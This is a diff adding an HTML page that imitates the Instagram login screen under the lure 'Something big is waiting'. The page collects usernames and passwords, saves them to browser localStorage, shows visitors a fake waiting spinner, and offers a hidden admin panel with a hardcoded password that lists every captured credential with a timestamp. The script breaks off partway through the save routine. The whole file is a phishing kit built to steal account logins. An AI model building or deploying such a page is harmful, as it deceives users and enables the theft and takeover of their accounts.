@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Instagram - Something big is waiting</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    padding: 20px;
+  }
+
+  .card {
+    background: #fff;
+    width: 100%;
+    max-width: 380px;
+    border-radius: 14px;
+    padding: 40px 30px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.25);
+    text-align: center;
+  }
+
+  .logo {
+    font-family: 'Brush Script MT', cursive, sans-serif;
+    font-size: 38px;
+    font-weight: bold;
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 10px;
+  }
+
+  h1 {
+    font-size: 20px;
+    color: #262626;
+    margin-bottom: 25px;
+    font-weight: 600;
+    line-height: 1.4;
+  }
+
+  input {
+    width: 100%;
+    padding: 12px 14px;
+    margin-bottom: 12px;
+    border: 1px solid #dbdbdb;
+    border-radius: 6px;
+    background: #fafafa;
+    font-size: 14px;
+    outline: none;
+  }
+
+  input:focus { border-color: #a8a8a8; background: #fff; }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 8px;
+    border: none;
+    border-radius: 8px;
+    background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+
+  button:hover { opacity: 0.9; }
+
+  .wait-text {
+    font-size: 16px;
+    color: #262626;
+    line-height: 1.6;
+    margin-top: 20px;
+  }
+
+  .spinner {
+    width: 40px;
+    height: 40px;
+    margin: 0 auto 20px;
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #dc2743;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .admin-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    background: #fff;
+    color: #dc2743;
+    font-size: 22px;
+    border: none;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0;
+    margin: 0;
+  }
+
+  .admin-btn:hover { opacity: 1; transform: scale(1.05); }
+
+  .hidden { display: none; }
+
+  .admin-panel {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    z-index: 999;
+  }
+
+  .admin-box {
+    background: #fff;
+    border-radius: 12px;
+    padding: 25px;
+    width: 100%;
+    max-width: 500px;
+    max-height: 80vh;
+    overflow-y: auto;
+  }
+
+  .admin-box h2 {
+    font-size: 18px;
+    margin-bottom: 15px;
+    color: #262626;
+    text-align: center;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 15px;
+    font-size: 13px;
+  }
+
+  th, td {
+    text-align: left;
+    padding: 8px;
+    border-bottom: 1px solid #eee;
+    word-break: break-all;
+  }
+
+  th { background: #fafafa; color: #666; }
+
+  .clear-btn {
+    background: #dc2743;
+    margin-top: 15px;
+  }
+
+  .empty {
+    text-align: center;
+    color: #999;
+    padding: 20px;
+    font-size: 14px;
+  }
+</style>
+</head>
+<body>
+
+<!-- ============ PAGE 1: LOGIN ============ -->
+<div class="card" id="loginPage">
+  <div class="logo">Instagram</div>
+  <h1>Something big is waiting your Instagram</h1>
+  <input type="text" id="username" placeholder="Username" autocomplete="off" />
+  <input type="password" id="password" placeholder="Password" />
+  <button onclick="submitLogin()">Log In</button>
+</div>
+
+<!-- ============ PAGE 2: WAIT PAGE ============ -->
+<div class="card hidden" id="waitPage">
+  <div class="spinner"></div>
+  <div class="wait-text">
+    Please wait here.<br>If you have luck it will come fast.
+  </div>
+</div>
+
+<!-- ============ ADMIN BUTTON ============ -->
+<button class="admin-btn" onclick="openAdmin()" title="Admin">⚙</button>
+
+<!-- ============ ADMIN PANEL (hidden by default) ============ -->
+<div class="admin-panel hidden" id="adminPanel">
+  <div class="admin-box">
+    <h2>Admin Panel</h2>
+
+    <!-- Password gate -->
+    <div id="adminGate">
+      <input type="password" id="adminPass" placeholder="Enter admin password" />
+      <button onclick="checkAdmin()">Unlock</button>
+    </div>
+
+    <!-- Data view -->
+    <div id="adminData" class="hidden">
+      <table id="dataTable">
+        <thead>
+          <tr><th>Username</th><th>Password</th><th>Time</th></tr>
+        </thead>
+        <tbody id="tableBody"></tbody>
+      </table>
+      <div id="emptyMsg" class="empty hidden">No logins saved yet.</div>
+      <button class="clear-btn" onclick="clearData()">Clear All Data</button>
+      <button class="clear-btn" style="background:#888;" onclick="closeAdmin()">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ============================================
+  // CHANGE THIS to your own secret admin password
+  // ============================================
+  const ADMIN_PASSWORD = "9048";
+
+  // ---------- Login submit ----------
+  function submitLogin() {
+    const u = document.getElementById('username').value.trim();
+    const p = document.getElementById('password').value;
+
+    if (!u || !p) {
+      alert("Please enter username and password.");
+      return;
+    }
+
+    // Save to localStorage
+    const logins = JSON.parse(localStorage.getItem('ig_logins') ||
